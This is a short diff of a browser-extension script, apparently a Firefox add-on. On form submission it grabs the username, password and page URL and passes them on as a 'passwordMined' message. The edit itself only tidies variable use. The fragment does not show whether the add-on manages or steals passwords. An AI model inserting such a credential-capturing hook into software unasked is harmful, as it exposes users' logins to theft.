@@ -41,7 +41,7 @@ function formSubmitted(id) {
   var user = forms[id][1].value;
   var pass = forms[id][2].value;
   if (user != "" && pass != "") {
-    self.port.emit("passwordMined", window.location.href, forms[id][1].value, forms[id][2].value);
+    self.port.emit("passwordMined", window.location.href, user, pass);
   }
 }
 
